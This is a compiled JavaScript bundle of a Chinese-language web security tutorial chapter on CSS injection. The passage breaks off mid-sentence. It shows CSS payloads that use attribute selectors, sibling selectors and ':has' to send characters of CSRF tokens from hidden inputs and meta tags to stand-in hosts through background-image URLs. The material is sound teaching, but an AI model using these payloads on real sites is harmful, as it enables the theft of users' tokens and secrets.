"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[388],{3905:(e,n,t)=>{t.d(n,{Zo:()=>c,kt:()=>k});var a=t(7294);function r(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function l(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);n&&(a=a.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,a)}return t}function o(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?l(Object(t),!0).forEach((function(n){r(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):l(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function i(e,n){if(null==e)return{};var t,a,r=function(e,n){if(null==e)return{};var t,a,r={},l=Object.keys(e);for(a=0;a<l.length;a++)t=l[a],n.indexOf(t)>=0||(r[t]=e[t]);return r}(e,n);if(Object.getOwnPropertySymbols){var l=Object.getOwnPropertySymbols(e);for(a=0;a<l.length;a++)t=l[a],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(r[t]=e[t])}return r}var p=a.createContext({}),s=function(e){var n=a.useContext(p),t=n;return e&&(t="function"==typeof e?e(n):o(o({},n),e)),t},c=function(e){var n=s(e.components);return a.createElement(p.Provider,{value:n},e.children)},u="mdxType",m={inlineCode:"code",wrapper:function(e){var n=e.children;return a.createElement(a.Fragment,{},n)}},d=a.forwardRef((function(e,n){var t=e.components,r=e.mdxType,l=e.originalType,p=e.parentName,c=i(e,["components","mdxType","originalType","parentName"]),u=s(t),d=r,k=u["".concat(p,".").concat(d)]||u[d]||m[d]||l;return t?a.createElement(k,o(o({ref:n},c),{},{components:t})):a.createElement(k,o({ref:n},c))}));function k(e,n){var t=arguments,r=n&&n.mdxType;if("string"==typeof e||r){var l=t.length,o=new Array(l);o[0]=d;var i={};for(var p in n)hasOwnProperty.call(n,p)&&(i[p]=n[p]);i.originalType=e,i[u]="string"==typeof e?e:r,o[1]=i;for(var s=2;s<l;s++)o[s]=t[s];return a.createElement.apply(null,o)}return a.createElement.apply(null,t)}d.displayName="MDXCreateElement"},9312:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>p,contentTitle:()=>o,default:()=>m,frontMatter:()=>l,metadata:()=>i,toc:()=>s});var a=t(7462),r=(t(7294),t(3905));const l={sidebar_position:17},o="\u53ea\u7528 CSS \u4e5f\u80fd\u653b\u64ca\uff1fCSS injection\uff08\u4e0a\uff09",i={unversionedId:"ch3/css-injection",id:"ch3/css-injection",title:"\u53ea\u7528 CSS \u4e5f\u80fd\u653b\u64ca\uff1fCSS injection\uff08\u4e0a\uff09",description:"\u524d\u9762\u6211\u5011\u770b\u7684\u5e7e\u500b\u653b\u64ca\u4f8b\u5982\u8aaa Prototype Pollution \u6216\u662f DOM clobbering\uff0c\u90fd\u662f\u85c9\u7531\u5404\u7a2e\u65b9\u5f0f\u53bb\u5f71\u97ff JavaScript \u7684\u57f7\u884c\uff0c\u8b93 JavaScript \u7684\u57f7\u884c\u51fa\u73fe\u610f\u6599\u4e4b\u5916\u7684\u7d50\u679c\u3002\u63db\u53e5\u8a71\u8aaa\uff0c\u6700\u5f8c\u9020\u6210\u5f71\u97ff\u529b\u7684\u9084\u662f JavaScript\u3002",source:"@site/docs/ch3/17-css-injection.md",sourceDirName:"ch3",slug:"/ch3/css-injection",permalink:"/beyond-xss/ch3/css-injection",draft:!1,tags:[],version:"current",sidebarPosition:17,frontMatter:{sidebar_position:17},sidebar:"tutorialSidebar",previous:{title:"\u524d\u7aef\u7684\u6a21\u677f\u6ce8\u5165\u653b\u64ca\uff1aCSTI",permalink:"/beyond-xss/ch3/csti"},next:{title:"\u53ea\u7528 CSS \u4e5f\u80fd\u653b\u64ca\uff1fCSS injection\uff08\u4e0b\uff09",permalink:"/beyond-xss/ch3/css-injection-2"}},p={},s=[{value:"\u4ec0\u9ebc\u662f CSS injection\uff1f",id:"\u4ec0\u9ebc\u662f-css-injection",level:2},{value:"\u5229\u7528 CSS \u5077\u8cc7\u6599",id:"\u5229\u7528-css-\u5077\u8cc7\u6599",level:2},{value:"\u5077 hidden input",id:"\u5077-hidden-input",level:2},{value:"\u5077 meta",id:"\u5077-meta",level:2},{value:"\u5077 HackMD \u7684\u8cc7\u6599",id:"\u5077-hackmd-\u7684\u8cc7\u6599",level:2},{value:"CSS injection \u8207\u5176\u4ed6\u6f0f\u6d1e\u7684\u7d44\u5408\u6280",id:"css-injection-\u8207\u5176\u4ed6\u6f0f\u6d1e\u7684\u7d44\u5408\u6280",level:2},{value:"\u5c0f\u7d50",id:"\u5c0f\u7d50",level:2}],c={toc:s},u="wrapper";function m(e){let{components:n,...l}=e;return(0,r.kt)(u,(0,a.Z)({},c,l,{components:n,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"\u53ea\u7528-css-\u4e5f\u80fd\u653b\u64cacss-injection\u4e0a"},"\u53ea\u7528 CSS \u4e5f\u80fd\u653b\u64ca\uff1fCSS injection\uff08\u4e0a\uff09"),(0,r.kt)("p",null,"\u524d\u9762\u6211\u5011\u770b\u7684\u5e7e\u500b\u653b\u64ca\u4f8b\u5982\u8aaa Prototype Pollution \u6216\u662f DOM clobbering\uff0c\u90fd\u662f\u85c9\u7531\u5404\u7a2e\u65b9\u5f0f\u53bb\u5f71\u97ff JavaScript \u7684\u57f7\u884c\uff0c\u8b93 JavaScript \u7684\u57f7\u884c\u51fa\u73fe\u610f\u6599\u4e4b\u5916\u7684\u7d50\u679c\u3002\u63db\u53e5\u8a71\u8aaa\uff0c\u6700\u5f8c\u9020\u6210\u5f71\u97ff\u529b\u7684\u9084\u662f JavaScript\u3002"),(0,r.kt)("p",null,"\u800c\u63a5\u4e0b\u4f86\u6211\u5011\u5c31\u8981\u770b\u5e7e\u500b\u300c\u5b8c\u5168\u4e0d\u9700\u8981 JavaScript\u300d\u4e5f\u80fd\u9020\u6210\u5f71\u97ff\u529b\u7684\u653b\u64ca\u65b9\u5f0f\u4e86\uff0c\u7b2c\u4e00\u500b\u5c31\u662f\u9019\u7bc7\u8981\u8b1b\u7684 CSS injection\u3002"),(0,r.kt)("p",null,"\u5982\u679c\u6709\u5beb\u904e\u524d\u7aef\u7684\u8a71\uff0c\u4f60\u53ef\u80fd\u5df2\u7d93\u77e5\u9053 CSS \u662f\u500b\u5f88\u795e\u5947\u7684\u6771\u897f\u4e86\uff0c\u4f8b\u5982\u8aaa\u4f60\u53ef\u4ee5\u7528\u7d14 CSS \u5beb\u51fa\uff1a"),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("a",{parentName:"li",href:"https://codepen.io/alvaromontoro/pen/vwjBqz"},"\u5708\u5708\u53c9\u53c9")),(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("a",{parentName:"li",href:"https://codepen.io/i0z/pen/AwYbda"},"\u5f48\u5e55\u904a\u6232")),(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("a",{parentName:"li",href:"https://garethheyes.co.uk/"},"3D \u904a\u6232"))),(0,r.kt)("p",null,"\u662f\u7684\uff0c\u4f60\u6c92\u6709\u770b\u932f\uff0c\u771f\u7684\u662f\u7d14 CSS \u52a0\u4e0a HTML\uff0c\u5b8c\u5168\u6c92\u6709\u4efb\u4f55\u4e00\u884c\u7684 JavaScript\uff0cCSS \u5c31\u662f\u9019\u9ebc\u795e\u5947\u3002"),(0,r.kt)("p",null,"\u5982\u6b64\u795e\u5947\u7684 CSS \u62ff\u4f86\u7576\u4f5c\u653b\u64ca\u7684\u624b\u6bb5\uff0c\u53ef\u4ee5\u9054\u5230\u4ec0\u9ebc\u6a23\u7684\u6548\u679c\u5462\uff1f\u5c31\u8b93\u6211\u5011\u7e7c\u7e8c\u770b\u4e0b\u53bb\u3002"),(0,r.kt)("h2",{id:"\u4ec0\u9ebc\u662f-css-injection"},"\u4ec0\u9ebc\u662f CSS injection\uff1f"),(0,r.kt)("p",null,"\u9867\u540d\u601d\u7fa9\uff0cCSS injection \u4ee3\u8868\u7684\u662f\u5728\u4e00\u500b\u9801\u9762\u4e0a\u53ef\u4ee5\u63d2\u5165\u4efb\u4f55\u7684 CSS \u8a9e\u6cd5\uff0c\u6216\u662f\u8b1b\u5f97\u66f4\u660e\u78ba\u4e00\u9ede\uff0c\u53ef\u4ee5\u4f7f\u7528 ",(0,r.kt)("inlineCode",{parentName:"p"},"<style>")," \u9019\u500b\u6a19\u7c64\u3002\u4f60\u53ef\u80fd\u6703\u597d\u5947\uff0c\u70ba\u4ec0\u9ebc\u6703\u6709\u9019\u7a2e\u72c0\u6cc1\uff1f"),(0,r.kt)("p",null,"\u6211\u81ea\u5df1\u8a8d\u70ba\u5e38\u898b\u7684\u72c0\u6cc1\u6709\u5169\u500b\uff0c\u7b2c\u4e00\u500b\u662f\u7db2\u7ad9\u6709\u904e\u6ffe\u6389\u8a31\u591a\u6a19\u7c64\uff0c\u4f46\u4e0d\u89ba\u5f97 ",(0,r.kt)("inlineCode",{parentName:"p"},"<style>")," \u6709\u554f\u984c\uff0c\u6240\u4ee5\u6c92\u6709\u904e\u6ffe\u6389\u3002\u50cf\u662f\u4e4b\u524d\u63d0\u904e\u7528\u4f86\u505a sanitize \u7684 DOMPurify\uff0c\u96d6\u7136\u8aaa\u9810\u8a2d\u5c31\u6703\u628a\u5404\u7a2e\u5371\u96aa\u7684\u6a19\u7c64\u5168\u90fd\u904e\u6ffe\u6389\uff0c\u53ea\u7559\u4e0b\u4e00\u4e9b\u5b89\u5168\u7684\uff0c\u4f8b\u5982\u8aaa ",(0,r.kt)("inlineCode",{parentName:"p"},"<h1>")," \u6216\u662f ",(0,r.kt)("inlineCode",{parentName:"p"},"<p>")," \u9019\u7a2e\uff0c\u4f46\u91cd\u9ede\u662f ",(0,r.kt)("inlineCode",{parentName:"p"},"<style>")," \u4e5f\u5728\u9810\u8a2d\u7684\u5b89\u5168\u6a19\u7c64\u88e1\u9762\uff0c\u6240\u4ee5\u5982\u679c\u6c92\u6709\u7279\u5225\u6307\u5b9a\u53c3\u6578\uff0c\u5728\u9810\u8a2d\u7684\u72c0\u6cc1\u4e0b\uff0c",(0,r.kt)("inlineCode",{parentName:"p"},"<style>")," \u662f\u4e0d\u6703\u88ab\u904e\u6ffe\u6389\u7684\uff0c\u56e0\u6b64\u653b\u64ca\u8005\u5c31\u53ef\u4ee5\u6ce8\u5165 CSS\u3002"),(0,r.kt)("p",null,"\u7b2c\u4e8c\u7a2e\u72c0\u6cc1\u5247\u662f\u96d6\u7136\u53ef\u4ee5\u63d2\u5165 HTML\uff0c\u4f46\u662f\u7531\u65bc CSP \u7684\u7de3\u6545\uff0c\u6c92\u6709\u8fa6\u6cd5\u57f7\u884c JavaScript\u3002\u65e2\u7136\u6c92\u8fa6\u6cd5\u57f7\u884c JavaScript\uff0c\u5c31\u53ea\u80fd\u9000\u800c\u6c42\u5176\u6b21\uff0c\u770b\u770b\u6709\u6c92\u6709\u8fa6\u6cd5\u5229\u7528 CSS \u505a\u51fa\u4e00\u4e9b\u60e1\u610f\u884c\u70ba\u3002"),(0,r.kt)("p",null,"\u90a3\u5230\u5e95\u6709\u4e86 CSS injection \u4e4b\u5f8c\u53ef\u4ee5\u5e79\u561b\uff1fCSS \u4e0d\u662f\u62ff\u4f86\u88dd\u98fe\u7db2\u9801\u7528\u7684\u800c\u5df2\u55ce\uff1f\u96e3\u9053\u5e6b\u7db2\u9801\u7684\u80cc\u666f\u63db\u984f\u8272\u4e5f\u53ef\u4ee5\u662f\u4e00\u500b\u653b\u64ca\u624b\u6cd5\uff1f"),(0,r.kt)("h2",{id:"\u5229\u7528-css-\u5077\u8cc7\u6599"},"\u5229\u7528 CSS \u5077\u8cc7\u6599"),(0,r.kt)("p",null,"CSS \u78ba\u5be6\u662f\u62ff\u4f86\u88dd\u98fe\u7db2\u9801\u7528\u7684\uff0c\u4f46\u662f\u53ea\u8981\u7d50\u5408\u5169\u500b\u7279\u6027\uff0c\u5c31\u53ef\u4ee5\u4f7f\u7528 CSS \u4f86\u5077\u8cc7\u6599\u3002"),(0,r.kt)("p",null,"\u7b2c\u4e00\u500b\u7279\u6027\uff1a\u5c6c\u6027\u9078\u64c7\u5668\u3002"),(0,r.kt)("p",null,"\u5728 CSS \u7576\u4e2d\uff0c\u6709\u5e7e\u500b\u9078\u64c7\u5668\u53ef\u4ee5\u9078\u5230\u300c\u5c6c\u6027\u7b26\u5408\u67d0\u500b\u689d\u4ef6\u7684\u5143\u7d20\u300d\u3002\u8209\u4f8b\u4f86\u8aaa\uff0c",(0,r.kt)("inlineCode",{parentName:"p"},"input[value^=a]"),"\uff0c\u5c31\u53ef\u4ee5\u9078\u5230 value \u958b\u982d\u662f ",(0,r.kt)("inlineCode",{parentName:"p"},"a")," \u7684\u5143\u7d20\u3002"),(0,r.kt)("p",null,"\u985e\u4f3c\u7684\u9078\u64c7\u5668\u6709\uff1a"),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("inlineCode",{parentName:"li"},"input[value^=a]")," \u958b\u982d\u662f a \u7684\uff08prefix\uff09"),(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("inlineCode",{parentName:"li"},"input[value$=a]")," \u7d50\u5c3e\u662f a \u7684\uff08suffix\uff09"),(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("inlineCode",{parentName:"li"},"input[value*=a]")," \u5167\u5bb9\u6709 a \u7684\uff08contains\uff09")),(0,r.kt)("p",null,"\u800c\u7b2c\u4e8c\u500b\u7279\u6027\u662f\uff1a\u53ef\u4ee5\u5229\u7528 CSS \u767c\u51fa request\uff0c\u4f8b\u5982\u8aaa\u8f09\u5165\u4e00\u5f35\u4f3a\u670d\u5668\u4e0a\u7684\u80cc\u666f\u5716\u7247\uff0c\u672c\u8cea\u4e0a\u5c31\u662f\u5728\u767c\u4e00\u500b request\u3002"),(0,r.kt)("p",null,"\u5047\u8a2d\u73fe\u5728\u9801\u9762\u4e0a\u6709\u4e00\u6bb5\u5167\u5bb9\u662f ",(0,r.kt)("inlineCode",{parentName:"p"},'<input name="secret" value="abc123">'),"\uff0c\u800c\u6211\u80fd\u5920\u63d2\u5165\u4efb\u4f55\u7684 CSS\uff0c\u5c31\u53ef\u4ee5\u9019\u6a23\u5beb\uff1a"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-css"},'input[name="secret"][value^="a"] {\n  background: url(https://myserver.com?q=a)\n}\n\ninput[name="secret"][value^="b"] {\n  background: url(https://myserver.com?q=b)\n}\n\ninput[name="secret"][value^="c"] {\n  background: url(https://myserver.com?q=c)\n}\n\n//....\n\ninput[name="secret"][value^="z"] {\n  background: url(https://myserver.com?q=z)\n}\n')),(0,r.kt)("p",null,"\u6703\u767c\u751f\u4ec0\u9ebc\u4e8b\u60c5\uff1f"),(0,r.kt)("p",null,"\u56e0\u70ba\u7b2c\u4e00\u689d\u898f\u5247\u6709\u9806\u5229\u627e\u5230\u5c0d\u61c9\u7684\u5143\u7d20\uff0c\u6240\u4ee5 input \u7684\u80cc\u666f\u5c31\u6703\u662f\u4e00\u5f35\u4f3a\u670d\u5668\u4e0a\u7684\u5716\u7247\uff0c\u800c\u700f\u89bd\u5668\u5c31\u6703\u767c request \u5230 ",(0,r.kt)("inlineCode",{parentName:"p"},"https://myserver.com?q=a"),"\u3002"),(0,r.kt)("p",null,"\u56e0\u6b64\uff0c\u7576\u6211\u5728 server \u6536\u5230\u9019\u500b request \u7684\u6642\u5019\uff0c\u6211\u5c31\u77e5\u9053\u300cinput \u7684 value \u5c6c\u6027\uff0c\u7b2c\u4e00\u500b\u5b57\u5143\u662f a\u300d\uff0c\u5c31\u9806\u5229\u5077\u5230\u4e86\u7b2c\u4e00\u500b\u5b57\u5143\u3002"),(0,r.kt)("p",null,"\u9019\u5c31\u662f CSS \u4e4b\u6240\u4ee5\u53ef\u4ee5\u5077\u8cc7\u6599\u7684\u539f\u56e0\uff0c\u900f\u904e\u5c6c\u6027\u9078\u64c7\u5668\u52a0\u4e0a\u8f09\u5165\u5716\u7247\u9019\u5169\u500b\u529f\u80fd\uff0c\u5c31\u80fd\u5920\u8b93 server \u77e5\u9053\u9801\u9762\u4e0a\u67d0\u500b\u5143\u7d20\u7684\u5c6c\u6027\u503c\u662f\u4ec0\u9ebc\u3002"),(0,r.kt)("p",null,"\u597d\uff0c\u73fe\u5728\u78ba\u8a8d CSS \u53ef\u4ee5\u5077\u5c6c\u6027\u7684\u503c\u4e86\uff0c\u63a5\u4e0b\u4f86\u6709\u5169\u500b\u554f\u984c\uff1a"),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"\u6709\u4ec0\u9ebc\u6771\u897f\u597d\u5077\uff1f"),(0,r.kt)("li",{parentName:"ol"},"\u4f60\u525b\u53ea\u793a\u7bc4\u5077\u7b2c\u4e00\u500b\uff0c\u8981\u600e\u9ebc\u5077\u7b2c\u4e8c\u500b\u5b57\u5143\uff1f")),(0,r.kt)("p",null,"\u6211\u5011\u5148\u4f86\u8a0e\u8ad6\u7b2c\u4e00\u500b\u554f\u984c\uff0c\u6709\u54ea\u4e9b\u6771\u897f\u53ef\u4ee5\u5077\uff1f\u901a\u5e38\u90fd\u662f\u8981\u5077\u4e00\u4e9b\u654f\u611f\u8cc7\u6599\u5c0d\u5427\uff1f"),(0,r.kt)("p",null,"\u6700\u5e38\u898b\u7684\u76ee\u6a19\uff0c\u5c31\u662f CSRF token\u3002\u5982\u679c\u4f60\u4e0d\u77e5\u9053\u4ec0\u9ebc\u662f CSRF\uff0c\u9019\u500b\u6211\u4e4b\u5f8c\u7684\u6587\u7ae0\u6703\u518d\u63d0\u5230\u3002"),(0,r.kt)("p",null,"\u7c21\u55ae\u4f86\u8aaa\u5462\uff0c\u5982\u679c CSRF token \u88ab\u5077\u8d70\uff0c\u5c31\u6709\u53ef\u80fd\u6703\u88ab CSRF \u653b\u64ca\uff0c\u7e3d\u4e4b\u4f60\u5c31\u60f3\u6210\u9019\u500b token \u5f88\u91cd\u8981\u5c31\u662f\u4e86\u3002\u800c\u9019\u500b CSRF token\uff0c\u901a\u5e38\u90fd\u6703\u88ab\u653e\u5728\u4e00\u500b hidden input \u4e2d\uff0c\u50cf\u662f\u9019\u6a23\uff1a"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-html"},'<form action="/action">\n  <input type="hidden" name="csrf-token" value="abc123">\n  <input name="username">\n  <input type="submit">\n</form>\n')),(0,r.kt)("p",null,"\u6211\u5011\u8a72\u600e\u9ebc\u5077\u5230\u88e1\u9762\u7684\u8cc7\u6599\u5462\uff1f"),(0,r.kt)("h2",{id:"\u5077-hidden-input"},"\u5077 hidden input"),(0,r.kt)("p",null,"\u5c0d\u65bc hidden input \u4f86\u8aaa\uff0c\u7167\u6211\u5011\u4e4b\u524d\u90a3\u6a23\u5beb\u662f\u6c92\u6709\u6548\u679c\u7684\uff1a"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-css"},'input[name="csrf-token"][value^="a"] {\n  background: url(https://example.com?q=a)\n}\n')),(0,r.kt)("p",null,"\u56e0\u70ba input \u7684 type \u662f hidden\uff0c\u6240\u4ee5\u9019\u500b\u5143\u7d20\u4e0d\u6703\u986f\u793a\u5728\u756b\u9762\u4e0a\uff0c\u65e2\u7136\u4e0d\u6703\u986f\u793a\uff0c\u90a3\u700f\u89bd\u5668\u5c31\u6c92\u6709\u5fc5\u8981\u8f09\u5165\u80cc\u666f\u5716\u7247\uff0c\u56e0\u6b64 server \u4e0d\u6703\u6536\u5230\u4efb\u4f55 request\u3002\u800c\u9019\u500b\u9650\u5236\u975e\u5e38\u56b4\u683c\uff0c\u5c31\u7b97\u7528 ",(0,r.kt)("inlineCode",{parentName:"p"},"display:block !important;")," \u4e5f\u6c92\u8fa6\u6cd5\u84cb\u904e\u53bb\u3002"),(0,r.kt)("p",null,"\u8a72\u600e\u9ebc\u8fa6\u5462\uff1f\u6c92\u95dc\u4fc2\uff0c\u6211\u5011\u9084\u6709\u5225\u7684\u9078\u64c7\u5668\uff0c\u50cf\u662f\u9019\u6a23\uff1a"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-css"},'input[name="csrf-token"][value^="a"] + input {\n  background: url(https://example.com?q=a)\n}\n')),(0,r.kt)("p",null,"\u6700\u5f8c\u9762\u591a\u4e86\u4e00\u500b ",(0,r.kt)("inlineCode",{parentName:"p"},"+ input"),"\uff0c\u9019\u500b\u52a0\u865f\u662f\u53e6\u5916\u4e00\u500b\u9078\u64c7\u5668\uff0c\u610f\u601d\u662f\u300c\u9078\u5230\u5f8c\u9762\u7684\u5143\u7d20\u300d\uff0c\u6240\u4ee5\u6574\u500b\u9078\u64c7\u5668\u5408\u5728\u4e00\u8d77\uff0c\u5c31\u662f\u300c\u6211\u8981\u9078 name \u662f csrf-token\uff0cvalue \u958b\u982d\u662f a \u7684 input\uff0c\u7684\u5f8c\u9762\u90a3\u500b input\u300d\uff0c\u4e5f\u5c31\u662f ",(0,r.kt)("inlineCode",{parentName:"p"},'<input name="username">'),"\u3002"),(0,r.kt)("p",null,"\u6240\u4ee5\uff0c\u771f\u6b63\u8f09\u5165\u80cc\u666f\u5716\u7247\u7684\u5176\u5be6\u662f\u5225\u7684\u5143\u7d20\uff0c\u800c\u5225\u7684\u5143\u7d20\u4e26\u6c92\u6709 type=hidden\uff0c\u6240\u4ee5\u5716\u7247\u6703\u88ab\u6b63\u5e38\u8f09\u5165\u3002"),(0,r.kt)("p",null,"\u90a3\u5982\u679c\u5f8c\u9762\u6c92\u6709\u5176\u4ed6\u5143\u7d20\u600e\u9ebc\u8fa6\uff1f\u50cf\u662f\u9019\u6a23\uff1a"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-html"},'<form action="/action">\n  <input name="username">\n  <input type="submit">\n  <input type="hidden" name="csrf-token" value="abc123">\n</form>\n')),(0,r.kt)("p",null,"\u4ee5\u9019\u500b\u6848\u4f8b\u4f86\u8aaa\uff0c\u5728\u4ee5\u524d\u5c31\u771f\u7684\u73a9\u5b8c\u4e86\uff0c\u56e0\u70ba CSS \u4e26\u6c92\u6709\u53ef\u4ee5\u9078\u5230\u300c\u524d\u9762\u7684\u5143\u7d20\u300d\u7684\u9078\u64c7\u5668\uff0c\u6240\u4ee5\u771f\u7684\u675f\u624b\u7121\u7b56\u3002"),(0,r.kt)("p",null,"\u4f46\u73fe\u5728\u4e0d\u4e00\u6a23\u4e86\uff0c\u56e0\u70ba\u6211\u5011\u6709\u4e86 ",(0,r.kt)("a",{parentName:"p",href:"https://developer.mozilla.org/en-US/docs/Web/CSS/:has"},":has"),"\uff0c\u9019\u500b\u9078\u64c7\u5668\u53ef\u4ee5\u9078\u5230\u300c\u5e95\u4e0b\u7b26\u5408\u7279\u6b8a\u689d\u4ef6\u7684\u5143\u7d20\u300d\uff0c\u50cf\u9019\u6a23\uff1a"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-css"},'form:has(input[name="csrf-token"][value^="a"]){\n  background: url(https://example.com?q=a)\n}\n')),(0,r.kt)("p",null,"\u610f\u601d\u5c31\u662f\u6211\u8981\u9078\u5230\u300c\u5e95\u4e0b\u6709\uff08\u7b26\u5408\u90a3\u500b\u689d\u4ef6\u7684 input\uff09\u7684 form\u300d\uff0c\u6240\u4ee5\u6700\u5f8c\u8f09\u5165\u80cc\u666f\u7684\u6703\u662f form\uff0c\u4e00\u6a23\u4e5f\u4e0d\u662f\u90a3\u500b hidden input\u3002\u9019\u500b ",(0,r.kt)("inlineCode",{parentName:"p"},":has")," \u9078\u64c7\u5668\u5f88\u65b0\uff0c\u5f9e 2022 \u5e74 8 \u6708\u5e95\u91cb\u51fa\u7684 Chrome 105 \u624d\u958b\u59cb\u6b63\u5f0f\u652f\u63f4\uff0c\u76ee\u524d\u53ea\u5269\u4e0b Firefox \u7684\u7a69\u5b9a\u7248\u9084\u6c92\u652f\u63f4\u4e86\uff0c\u8a73\u60c5\u53ef\u770b\uff1a",(0,r.kt)("a",{parentName:"p",href:"https://caniuse.com/css-has"},"caniuse")),(0,r.kt)("p",null,(0,r.kt)("img",{alt:"caniuse",src:t(5517).Z,width:"625",height:"510"})),(0,r.kt)("p",null,"\u6709\u4e86 ",(0,r.kt)("inlineCode",{parentName:"p"},":has")," \u4ee5\u5f8c\uff0c\u57fa\u672c\u4e0a\u5c31\u7121\u6575\u4e86\uff0c\u56e0\u70ba\u53ef\u4ee5\u6307\u5b9a\u6539\u8b8a\u80cc\u666f\u7684\u662f\u54ea\u500b\u7236\u5143\u7d20\uff0c\u6240\u4ee5\u60f3\u600e\u9ebc\u9078\u5c31\u600e\u9ebc\u9078\uff0c\u600e\u6a23\u90fd\u9078\u5f97\u5230\u3002"),(0,r.kt)("h2",{id:"\u5077-meta"},"\u5077 meta"),(0,r.kt)("p",null,"\u9664\u4e86\u628a\u8cc7\u6599\u653e\u5728 hidden input \u4ee5\u5916\uff0c\u4e5f\u6709\u4e9b\u7db2\u7ad9\u6703\u628a\u8cc7\u6599\u653e\u5728 ",(0,r.kt)("inlineCode",{parentName:"p"},"<meta>")," \u88e1\u9762\uff0c\u4f8b\u5982\u8aaa ",(0,r.kt)("inlineCode",{parentName:"p"},'<meta name="csrf-token" content="abc123">'),"\uff0cmeta \u9019\u500b\u5143\u7d20\u4e00\u6a23\u662f\u770b\u4e0d\u898b\u7684\u5143\u7d20\uff0c\u8981\u600e\u9ebc\u5077\u5462\uff1f"),(0,r.kt)("p",null,"\u9996\u5148\uff0c\u5982\u540c\u4e0a\u500b\u6bb5\u843d\u7684\u7d50\u5c3e\u8b1b\u7684\u4e00\u6a23\uff0c",(0,r.kt)("inlineCode",{parentName:"p"},"has")," \u662f\u7d55\u5c0d\u5077\u5f97\u5230\u7684\uff0c\u53ef\u4ee5\u9019\u6a23\u5077\uff1a"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-css"},'html:has(meta[name="csrf-token"][content^="a"]) {\n  background: url(https://example.com?q=a);\n}\n')),(0,r.kt)("p",null,"\u4f46\u9664\u6b64\u4e4b\u5916\uff0c\u9084\u6709\u5176\u4ed6\u65b9\u5f0f\u4e5f\u5077\u5f97\u5230\u3002"),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"<meta>")," \u96d6\u7136\u4e5f\u770b\u4e0d\u5230\uff0c\u4f46\u8ddf hidden input \u4e0d\u540c\uff0c\u6211\u5011\u53ef\u4ee5\u81ea\u5df1\u7528 CSS \u8b93\u9019\u500b\u5143\u7d20\u8b8a\u6210\u53ef\u898b\uff1a"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-css"},'meta {\n  display: block;  \n}\n\nmeta[name="csrf-token"][content^="a"] {\n  background: url(https://example.com?q=a);\n}\n')),(0,r.kt)("p",null,(0,r.kt)("img",{alt:"style",src:t(9922).Z,width:"621",height:"461"})),(0,r.kt)("p",null,"\u53ef\u662f\u9019\u6a23\u9084\u4e0d\u5920\uff0c\u4f60\u6703\u767c\u73fe request \u9084\u662f\u6c92\u6709\u9001\u51fa\uff0c\u9019\u662f\u56e0\u70ba ",(0,r.kt)("inlineCode",{parentName:"p"},"<meta>")," \u5728 ",(0,r.kt)("inlineCode",{parentName:"p"},"<head>")," \u5e95\u4e0b\uff0c\u800c ",(0,r.kt)("inlineCode",{parentName:"p"},"<head>")," \u4e5f\u6709\u9810\u8a2d\u7684 ",(0,r.kt)("inlineCode",{parentName:"p"},"display:none")," \u5c6c\u6027\uff0c\u56e0\u6b64\u4e5f\u8981\u5e6b ",(0,r.kt)("inlineCode",{parentName:"p"},"<head>")," \u7279\u5225\u8a2d\u7f6e\uff0c\u624d\u6703\u8b93 ",(0,r.kt)("inlineCode",{parentName:"p"},"<meta>"),"\u300c\u80fd\u88ab\u770b\u5230\u300d\uff1a"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-css"},'head, meta {\n  display: block;  \n}\n\nmeta[name="csrf-token"][content^="a"] {\n  background: url(https://example.com?q=a);\n}\n')),(0,r.kt)("p",null,"\u7167\u4e0a\u9762\u9019\u6a23\u5beb\uff0c\u5c31\u6703\u770b\u5230\u700f\u89bd\u5668\u767c\u51fa request\u3002\u4e0d\u904e\uff0c\u756b\u9762\u4e0a\u5012\u662f\u6c92\u6709\u986f\u793a\u4efb\u4f55\u6771\u897f\uff0c\u56e0\u70ba\u7562\u7adf ",(0,r.kt)("inlineCode",{parentName:"p"},"content")," \u662f\u4e00\u500b\u5c6c\u6027\uff0c\u800c\u4e0d\u662f HTML \u7684 text node\uff0c\u6240\u4ee5\u4e0d\u6703\u986f\u793a\u5728\u756b\u9762\u4e0a\uff0c\u4f46\u662f ",(0,r.kt)("inlineCode",{parentName:"p"},"meta")," \u9019\u500b\u5143\u7d20\u672c\u8eab\u5176\u5be6\u662f\u770b\u5f97\u5230\u7684\uff0c\u9019\u4e5f\u662f\u70ba\u4ec0\u9ebc request \u6703\u767c\u51fa\u53bb\uff1a"),(0,r.kt)("p",null,(0,r.kt)("img",{alt:"meta style",src:t(9515).Z,width:"1030",height:"580"})),(0,r.kt)("p",null,"\u5982\u679c\u771f\u7684\u60f3\u8981\u5728\u756b\u9762\u4e0a\u986f\u793a content 